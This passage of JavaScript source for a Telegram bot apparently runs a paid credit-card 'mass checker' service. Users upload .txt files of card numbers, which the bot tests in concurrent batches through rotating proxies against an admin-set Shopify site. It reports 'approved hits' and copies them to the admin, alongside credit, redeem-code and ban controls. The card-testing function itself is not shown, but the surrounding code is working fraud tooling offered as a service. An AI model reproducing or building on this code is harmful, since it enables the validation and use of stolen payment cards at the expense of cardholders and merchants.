  if (state === "WAITING_ADMIN_USERID" && chatId === adminId) {
    let targetId = text.trim();
    bot.sendMessage(chatId, `Managing User: ${targetId}`, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Ban User", callback_data: `admin_mod_ban_${targetId}` },
            { text: "Unban", callback_data: `admin_mod_unban_${targetId}` },
          ],
          [
            {
              text: "Give 1K (7D)",
              callback_data: `admin_mod_give_${targetId}_1000`,
            },
            {
              text: "Give 2K (7D)",
              callback_data: `admin_mod_give_${targetId}_2000`,
            },
          ],
          [
            {
              text: "Give 10K (30D)",
              callback_data: `admin_mod_give_${targetId}_10000`,
            },
          ],
        ],
      },
    });
    delete userStates[chatId];
  } else if (state === "WAITING_BROADCAST" && chatId === adminId) {
    delete userStates[chatId];
    const users = await User.find({ isBanned: false });
    let sent = 0;
    bot.sendMessage(chatId, "Sending broadcast, please wait...");
    for (let u of users) {
      try {
        await bot.sendMessage(
          u.chatId,
          `📢 <b>BroadCast By Dev</b>\n━━━━━━━━━━━━━━━━━\n${escapeHTML(text)}`,
          { parse_mode: "HTML" },
        );
        sent++;
      } catch (e) {}
    }
    bot.sendMessage(chatId, `✅ Broadcast completed. Sent to ${sent} users.`);
  }
});

// Redeem Command
bot.onText(/^\/redeem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const code = match[1].trim();

  let rd = await Redeem.findOne({ code });
  if (!rd) return bot.sendMessage(chatId, "❌ Redeem Code Invalid");
  if (rd.isUsed) return bot.sendMessage(chatId, "❌ Code Already Redeemed");

  rd.isUsed = true;
  rd.usedBy = chatId;
  await rd.save();

  let user = await getUser(chatId, msg.from.first_name);
  user.credits += rd.credits;
  user.planName = rd.planName;

  let endD = new Date();
  endD.setDate(endD.getDate() + rd.daysValid);
  user.planExpiry = endD;

  await user.save();

  const rdText = `<tg-emoji emoji-id="6255910936557653676">🤝</tg-emoji> <b>𝐑𝐞𝐝𝐞𝐞𝐦 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥</b>\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5215191209131123104">💎</tg-emoji> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐀𝐝𝐝𝐞𝐝:</b> ${rd.credits}\n<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐕𝐚𝐥𝐢𝐝 𝐅𝐨𝐫:</b> ${rd.daysValid} Days\n<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐏𝐥𝐚𝐧:</b> ${rd.planName}\n━━━━━━━━━━━━━━━━━\n<i>Enjoy your seamless checking!</i>`;

  bot.sendMessage(chatId, rdText, { parse_mode: "HTML" });
});

// --- FAST MASS CHECKER LOGIC (.TXT FILE UPLOAD) ---
bot.on("document", async (msg) => {
  const chatId = msg.chat.id;
  const user = await getUser(chatId, msg.from.first_name);

  if (userStates[chatId] !== "WAITING_TXT") return;
  delete userStates[chatId];

  if (user.isBanned) return bot.sendMessage(chatId, "⚠️ You are blocked.");

  const mimeType = msg.document.mime_type;
  const fileName = msg.document.file_name || "";

  if (mimeType !== "text/plain" && !fileName.endsWith(".txt")) {
    return bot.sendMessage(chatId, "❌ Please upload a valid .txt file only!");
  }

  const statusMsg = await bot.sendMessage(
    chatId,
    `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐟𝐢𝐥𝐞 𝐚𝐧𝐝 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤...</b>`,
    { parse_mode: "HTML" },
  );

  try {
    const fileLink = await bot.getFileLink(msg.document.file_id);
    const fileRes = await axios.get(fileLink);
    const textData = fileRes.data;

    let lines = textData
      .split("\n")
      .map((l) => l.trim())
      .filter((l) => l.length > 10);
    if (lines.length === 0) {
      return bot.editMessageText("❌ No valid CCs found in file.", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }

    // Check Credits
    if (!(await deductCredits(user, lines.length))) {
      let lackMsg = `<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>Insufficient Credits!</b>\nYou have ${user.credits} credits, but file contains ${lines.length} CCs.\nPlease buy or redeem.`;
      return bot.editMessageText(lackMsg, {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        parse_mode: "HTML",
      });
    }

    bot.editMessageText(
      `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> <b>𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 ${lines.length} 𝐜𝐚𝐫𝐝𝐬... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</b>\nApproved hits will be sent directly!`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" },
    );

    let approvedCount = 0;
    let declinedCount = 0;

    // Concurrent Batch Processing for Maximum Speed
    const concurrencyLimit = 3;

    for (let i = 0; i < lines.length; i += concurrencyLimit) {
      const chunk = lines.slice(i, i + concurrencyLimit);
      const promises = chunk.map((cc) => processCard(cc, getRandomProxy(user.proxies)));
      const results = await Promise.all(promises);

      for (let data of results) {
        if (data.isApproved) {
          approvedCount++;
          const resMsg = formatCardResult(
            data,
            msg.from.first_name,
            msg.from.id,
          );
          await bot.sendMessage(chatId, resMsg, { parse_mode: "HTML" });

          if (chatId !== adminId) {
            bot.sendMessage(
              adminId,
              `🟢 <b>𝐌𝐚𝐬𝐬 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐇𝐢𝐭 𝐁𝐲 <a href="tg://user?id=${chatId}">${escapeHTML(msg.from.first_name)}</a></b>\n━━━━━━━━━\n${resMsg}`,
              { parse_mode: "HTML" },
            );
          }
        } else {
          declinedCount++;
        }

        // Track total hits
        let u = await User.findOne({ chatId });
        if (data.isApproved) u.totalApproved++;
        else u.totalDeclined++;
        await u.save();
      }
    }

    const finalMsg = `<tg-emoji emoji-id="6138803821394009204">✨</tg-emoji> <b>𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!</b>\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <b>Approved:</b> ${approvedCount}\n<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>Declined:</b> ${declinedCount}\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>Dev: @ZeroSpade</b>`;

    bot.sendMessage(chatId, finalMsg, { parse_mode: "HTML" });
    bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
  } catch (error) {
    console.error("Mass check error:", error);
    bot.sendMessage(chatId, "❌ Error processing mass check file.");
  }
});

// --- ADMIN COMMAND: ADD SITE ---
bot.onText(/^\/addsite (.+)/, async (msg, match) => {
  try {
    if (msg.chat.id !== adminId) return;
    let url = match[1].trim();
    if (!url.startsWith("http")) url = "https://" + url;
    if (!url.endsWith("/")) url = url + "/";
    await Config.findOneAndUpdate(
      { key: "main_config" },
      { shopifySiteUrl: url },
      { upsert: true },
    );
    bot.sendMessage(msg.chat.id, `✅ Site updated to: ${url}`);
  } catch (error) {}
});
